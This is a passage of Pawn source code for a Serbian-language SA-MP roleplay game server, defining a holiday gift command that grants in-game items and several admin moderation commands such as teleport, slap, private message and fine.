				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}%dG {2641FE}zlata.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la", cash );
				SCMF(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}%dG {2641FE}zlata.", cash);
			}
			case 2:
			{
				new const cash = 100+random(100);
				PlayerInfo[playerid][xTorba_Droga] += cash;
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}%dG {2641FE}droge.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la", cash );
				SCMF(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}%dG {2641FE}droge.", cash);
			}
			case 3:
			{
				new const cash = 100+random(100);
				PlayerInfo[playerid][xTorba_Droga] += cash;
				sql_user_update_integer(playerid, "materials", PlayerInfo[playerid][xMaterijali]);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}%d {2641FE}materijala.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la", cash );
				SCMF(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}%d {2641FE}materijala.", cash);
			}
			case 4:
			{
				new const cash = 150+random(150);
				GivePlayerWeapon(playerid, 24, cash);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}Desert Eagle.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );
				SendClientMessage(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}Desert Eagle.");
			}
			case 5:
			{
				new const cash = 350+random(500);
				GivePlayerWeapon(playerid, 31, cash);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}M16.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );
				SendClientMessage(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}M16.");
			}
			case 6:
			{
				new const cash = 50+random(50);
				GivePlayerWeapon(playerid, 26, cash);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}Sawn-off.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );
				SendClientMessage(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}Sawn-off.");
			}
		}

		presentsInfo[ presentID ][ presTaken ] = true;
		UpdateDynamic3DTextLabelText( presentsInfo[ presentID ][ pres3d ], 0xFF0000FF, "Paketici\n{FFFFFF}Ovaj paketic je otvoren :(");
		SavePresent( presentID );

	#else

		SendErrorMessage( playerid, "Nije zimski period.");

	#endif
	return 1;
}

CMD:aktivirajpoklone( playerid )
{
    #if XMAS_MOD == 1

		if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

		foreach(new id : iter_Present)
		{
			if( presentsInfo[ id ][ presPlaced ] )
			{
			    if( presentsInfo[ id ][ presTaken ] )
				{
			        presentsInfo[ id ][ presTaken ] = false;
			        UpdateDynamic3DTextLabelText( presentsInfo[ id ][ pres3d ], 0x00FF00FF, "Paketici\n{FFFFFF}Ovaj paketic nije otvoren.\n\n{00FF00}Da otvorite paketic kucajte\n{FFFFFF}\"/poklon\"" );
			        SavePresent( id );
			    }
			}
		}
		SendClientMessage( playerid, CRVENA, "#POKLONI: {FFFFFF}Aktivirao si sve poklone." );

	#else

		SendErrorMessage( playerid, "Nije zimski period.");

	#endif
	return 1;
}

CMD:slap( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
	{
    	new igrac, razlog[15], Float:x, Float:y, Float:z;
	    if( sscanf(params, "us[15]", igrac, razlog ) ) return SendUsageMessage( playerid, "/slap [id] [razlog]" );
	    if( !IsPlayerConnected( igrac ) ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ igrac ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozes slapovati direktore i vlasnike!");
		if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 && (PlayerInfo[ igrac ][ xAdmin ] >= 1 || PlayerInfo[igrac][xSpecAdmin] >= 1) ) return SendErrorMessage( playerid, "Ne mozes admine." );
		if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 && PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes admine." );

		GetPlayerPos( igrac, x, y, z );
	    SMG_SetPlayerPos( igrac, x, y, z+2.5 );
 
	  	DodajWarnRed("~r~(SLAP) %s(%d) ~w~je osamari%s igraca ~r~%s ~w~| Razlog: ~r~%s", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( igrac ), razlog );

	  	SendInfoMessage( playerid, "Osamari%s si igraca {FFFFFF}%s. {4282C0}| Razlog: {FFFFFF}%s", getPolForString(playerid, "o", "la"), ImeIgraca( igrac ), razlog );
		SendInfoMessage( igrac, "A/GM {FFFFFF}%s {4282C0}vas je osamari%s. | Razlog: {FFFFFF}%s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), razlog );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:xgoto( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new Float:Poz[ 3 ];
	if( sscanf(params, "fff", Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] ) ) return SendUsageMessage( playerid, "/xgoto [x] [y] [z]" );

	if( IsPlayerInAnyVehicle( playerid ) ) SMG_SetVehiclePos( GetPlayerVehicleID( playerid ), Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
	else SMG_SetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[2] );

    SendInfoMessage( playerid, "Teleportovani ste na koordinate {FFFFFF}(%f - %f - %f).",Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
	return 1;
}

CMD:apark( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
        new Float:Pos[ 4 ];

        if( carspawntimer == 1 )
		{
			SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Neko je kupio/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");
			return 1;
		}
		if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
		if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u privatnom vozilu." );
        if( PlayerInfo[ playerid ][ xAdmin ] < 4 && VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Admin(1-3) mogu parkirati samo privatna vozila." );
        if( GetPlayerVehicleSeat( playerid ) != 0 ) return SendErrorMessage( playerid, "Morate biti u vozilu na vozackom mestu!");

		new autoid = GetPlayerVehicleID( playerid );

		GetVehiclePos( autoid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		GetVehicleZAngle( autoid, Pos[ 3 ] );

        VehicleInfo[ autoid ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
		VehicleInfo[ autoid ][ vInterior ] = GetPlayerInterior( playerid );

		VehicleInfo[ autoid ][ vLokacijaX ] = Pos[ 0 ];
		VehicleInfo[ autoid ][ vLokacijaY ] = Pos[ 1 ];
		VehicleInfo[ autoid ][ vLokacijaZ ] = Pos[ 2 ];
		VehicleInfo[ autoid ][ vLokacijaA ] = Pos[ 3 ];

        new q[ 200 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_pos_x` = '%f', `v_pos_y` = '%f', `v_pos_z` = '%f', `v_pos_a` = '%f', `v_virtualw` = '%d', `v_interior` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
						VehicleInfo[ autoid ][ vLokacijaX ],
						VehicleInfo[ autoid ][ vLokacijaY ],
						VehicleInfo[ autoid ][ vLokacijaZ ],
						VehicleInfo[ autoid ][ vLokacijaA ],
						VehicleInfo[ autoid ][ vVirtualWorld ],
						VehicleInfo[ autoid ][ vInterior ],
						VehicleInfo[ autoid ][ vSqlID ] );
		mysql_tquery( mSQL, q, "park_vehicleCheckID", "ii", -1, autoid );

		SetPlayerPos(playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ]+2);

		SendInfoMessage( playerid, "Uspesno ste parkirali vozilo ID {FFFFFF}(%d).", GetPlayerVehicleID( playerid ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:aupali( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new vehicle = GetPlayerVehicleID( playerid ), engine, lights, alarm, doors, bonnet, boot, objective;

	    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
	 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
	    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
		if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");

		GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
	    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

		StartingVehicle[playerid] = true;
		VehicleEngineStart(playerid);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:goto( playerid, const params[] )
{
    new Float:x, Float:y, Float:z, igrac;
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
	{
		if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/goto [id]." );
		if( igrac == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

		if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
		{
		    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati kod Admina." );
            if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
			if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na eventu." );
			if( PlayerInfo[ igrac ][ xAdmin ] > 0 ) return SendErrorMessage( playerid, "Ne mozes do Admina." );
        }
		else if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
		{
		    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati kod Admina." );
            if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
			if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na eventu." );
        }
		else if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
		{
			if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok svercas." );
		    if( PlayerInfo[ igrac ][ xGamemaster ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati do Gamemastera." );
		    if( PlayerInfo[ igrac ][ xSpecAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati do Spec Admina." );
		    if( PlayerInfo[ igrac ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati do igraca koj ima WL." );
		    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
		    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
		    if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati do Admina." );
		    if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
		    if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
			if( PlayerInfo[ igrac ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok je u jailu." );
            if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozes se portati dok je pljacka u toku." );
            if( NaDmEventu[ igrac ]) return SendErrorMessage( playerid, "Ne mozes dok je igrac na DM eventu." );
            if( uInterijeru[ playerid ] != -1 ) return SendErrorMessage( playerid, "Ne mozes da se portas dok si u interijeru.");
            if( uInterijeru[ igrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes da se portas do igraca koji je u interijeru.");
			if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na eventu." );

			if( ServerInfo[ PaketPoceo ] ) return SendErrorMessage( playerid, "Ne mozes se portati jer je pokrenut sistem paketa za mafije(ANTI ABUSE)." );
		}

		GetPlayerPos( igrac, x, y, z);
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ igrac ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete se teleportovati do direktora i vlasnika!" );

	    new veh, vw, int;
	    vw  = GetPlayerVirtualWorld(igrac);
	    int = GetPlayerInterior(igrac);

	    if(IsPlayerInAnyVehicle(igrac))
	    {
	        veh = GetPlayerVehicleID(igrac);

	        GetVehiclePos(veh, x, y, z);
	        z += 1.5;
	    } 
	    else
	    {
	        GetPlayerPos(igrac, x, y, z);
	        GetXYInFrontOfPlayer(igrac, x, y, 1.0);
	    }

	    SetPlayerInterior(playerid, int);
	    SetPlayerVirtualWorld(playerid, vw);

	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) 
	    {
	        new myVeh = GetPlayerVehicleID(playerid);
	        GetXYInFrontOfPlayer(igrac, x, y, 3.0);
	        SetVehiclePos(myVeh, x, y, z);
	    }
	    else 
	    {
	        SetPlayerPos(playerid, x, y, z);
	    }

		SendInfoMessage( playerid, "Teleportirani ste do igraca {FFFFFF}%s.", ImeIgraca( igrac ) );
		SendInfoMessage( igrac, "{FFFFFF}%s {4282C0}se teleportova%s do vas.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

		if( inOrgInt[ igrac ] != -1 )
		{
		    inOrgInt[ playerid ] = inOrgInt[ igrac ];
		}
		if( uInterijeru[ igrac ] != -1 )
		{
		    uInterijeru[ playerid ] = uInterijeru[ igrac ];
		}
		if( (PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 5) || PlayerInfo[playerid][xSpecAdmin] >= 1 )
		{ 
			DodajWarnRed("~y~(GOTO) %s(%d) ~w~se porta%s do igraca ~y~%s(%d).", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( igrac ), igrac );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:gethere( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 2 )
	{
	    new igrac, Float:x, Float:y, Float:z;
	    if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/gethere [id]." );
	    if( igrac == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
		{
		    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes getati kod Admina." );
            if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes getati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes getati dok si u jailu." );
			if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na eventu." );
			if( PlayerInfo[ igrac ][ xAdmin ] > 0 ) return SendErrorMessage( playerid, "Ne mozes Admina." );
        }
		else if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
		{
		    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati kod Admina." );
            if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
			if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na eventu." );
			if( PlayerInfo[ igrac ][ xAdmin ] > 0 && PlayerInfo[ igrac ][ xSpecAdmin ] > 0) return SendErrorMessage( playerid, "Ne mozes Admina." );
        }
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ igrac ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete getati direktora i vlasnika!" );

		if( PlayerInfo[ igrac ][ xZatvor ] != 0 && PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Ne mozes da teleportujes igraca iz jaila." );
		if( uFirmi[ playerid ] != -1 ) uFirmi[ igrac ] = uFirmi[ playerid ];
		if( uInterijeru[ playerid ] != -1 ) uInterijeru[ igrac ] = uInterijeru[ playerid ];
        if( inOrgInt[ playerid ] != -1 ) inOrgInt[ igrac ] = inOrgInt[ playerid ];

		GetPlayerPos( playerid, x, y, z );

        if( GetPlayerState( igrac ) == 2 ) SMG_SetVehiclePos( GetPlayerVehicleID( igrac ), x+5, y+5, z );
		else SMG_SetPlayerPos( igrac, x+1, y+1, z );

		SetPlayerInterior( igrac, GetPlayerInterior( playerid ) );
		SetPlayerVirtualWorld( igrac, GetPlayerVirtualWorld( playerid ) );
		SendInfoMessage( playerid, "Teleportirali ste igraca {FFFFFF}%s {4282C0}do sebe.", ImeIgraca( igrac ) );
  		SendInfoMessage( igrac, "{FFFFFF}%s {4282C0}vas je teleportovao do sebe.", ImeIgraca( playerid ) );

		if( PlayerInfo[ playerid ][ xAdmin ] < 5 )
		{
			GMChat( 0xFF4500FF, "[ADMIN] %s je porta%s do sebe igraca %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( igrac ) );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pm( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new id, apmtext[128];
	if( sscanf( params, "us[128]", id, apmtext ) ) return SendUsageMessage( playerid, "/pm [id] [text]");
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi poslat poruku!");
	if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 5 ) return SendErrorMessage( playerid, "Ne mozes pisati direktoru i vlasniku!");

	PlayerInfo[ playerid ][ xAGMStats ]++;
	sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

	SCMF( playerid, 0x4282C0FF, "#PM: Posla%s si PM {FFFFFF}'%s-u': {4282C0}%s", getPolForString(playerid, "o", "la"), ImeIgraca( id ), apmtext );
	SCMF( id, ZELENA, "#PM: {FFFFFF}%s: {4282C0}%s", ImeIgraca(playerid), apmtext );
 
	AdminMsg( 0xDB8A00FF, "[PM] %s -> %s: %s", ImeIgraca( playerid ), ImeIgraca( id ), apmtext );

	WriteLog("log-pm", "Admin %s -> Igrac: %s | Tekst: %s", ImeIgraca( playerid ), ImeIgraca( id ), apmtext);
	return 1;
}

CMD:aclearwl( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/aclearwl [id]");
	    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID.");

		PlayerInfo[ id ][ xWanted ] = 0;
	   	SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
	    strmid( ZlocinInfo[ id ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ id ][zPocinio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ id ][zZlocin], "Nema", 0, strlen("Nema"), 255);
		sql_user_update_integer( id, "wanted_level", PlayerInfo[ id ][ xWanted ] );
 
	   	DodajWarnRed("~y~(CLEAR) %s(%d) ~w~je skinu%s wanted level igracu ~y~%s(%d).", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( id ), id );

	    SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vam je skinu%s wanted level.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		SendInfoMessage( playerid, "Skinuli ste igracu {FFFFFF}%s {4282C0}wanted level.", ImeIgraca( id ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:setint( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

	    new id, intid;
		if( sscanf( params, "ui", id, intid ) ) return SendUsageMessage( playerid, "/setint [id] [int]");
		if( id == IPI) return SendErrorMessage( playerid, "Igrac nije online!");

	    SetPlayerInterior( id, intid);
 
	   	DodajWarnRed("~y~(SETINT) %s(%d) ~w~je postavi%s interior igracu ~y~%s(%d).", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( id ), id );

		SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vam je postavi%s interior na {FFFFFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), intid );
		SendInfoMessage( playerid, "Postavili ste igracu {FFFFFF}%s {4282C0}interior na {FFFFFF}(%d).", ImeIgraca( id ), intid );
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:setvw( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
	    //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

	    new id, vwid;
		if( sscanf( params, "ui", id, vwid ) ) return SendUsageMessage( playerid, "/setvw [id] [vw]");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");

	    SetPlayerVirtualWorld( id, vwid );
 
	   	DodajWarnRed("~y~(SETVW) %s(%d) ~w~je postavi%s virtual world igracu ~y~%s(%d).", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( id ), id );

		SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vam je postavi%s virtual world na {FFFFFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), vwid );
		SendInfoMessage( playerid, "Postavili ste igracu {FFFFFF}%s {4282C0}virtual world na {FFFFFF}(%d).", ImeIgraca( id ), vwid );
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:proverisqlidigraca( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
	{
        new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/proveriSQLidigraca [id]");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");

		SendInfoMessage( playerid, "{FFFFFF}Igrac: %s | xID: %d", ImeIgraca( id ), PlayerInfo[ id ][ xID ] );
    }
    return 1;
}

CMD:fine( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
	    new id, novac;
		if( sscanf( params, "ud", id, novac ) ) return SendUsageMessage( playerid, "/fine [id] [novac]");
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe kickovat!");
		if( novac < 1 ) return SendErrorMessage( playerid, "Novac ne moze ici ispod 1 !");
		if( novac > 1000000 ) return SendErrorMessage( playerid, "Novac ne moze ici preko 1000000 !");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozes fineovati direktore i vlasnike!");

		DajIgracuNovac( id, -novac );
		SCMF( id, 0xFF0000FF, "#FINE: {FFFFFF}Fineovani ste. {FF0000}| Admin: {FFFFFF}%s {FF0000}| Novac: {FFFFFF}(-$%s)", ImeIgraca( playerid ), fNumber(novac));
		SCMF( playerid, 0xFF0000FF, "#FINE: {FFFFFF}%s {FF0000}| Novac: {FFFFFF}(-$%s)", ImeIgraca( id ), fNumber(novac));
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je fineova%s igraca %s | -$%s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), fNumber(novac));

